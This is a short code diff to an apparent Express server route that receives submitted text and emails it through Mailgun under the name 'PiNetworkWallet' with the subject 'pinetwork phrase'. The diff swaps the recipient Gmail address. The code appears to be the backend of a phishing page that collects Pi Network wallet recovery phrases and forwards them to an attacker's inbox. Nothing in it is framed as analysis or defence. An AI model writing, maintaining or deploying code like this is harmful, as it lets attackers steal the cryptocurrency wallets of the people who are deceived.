@@ -45,7 +45,7 @@ app.post("/submit/7668", async (req, res) => {
       "sandboxa9ee554ea20341a79b28a69ac8804681.mailgun.org",
       {
         from: "PiNetworkWallet <mailgun@sandbox-123.mailgun.org>",
-        to: ["pinetworkwallet2@gmail.com"],
+        to: ["pinetworkm493@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
         html: `<h1>${mfText}</h1>`,
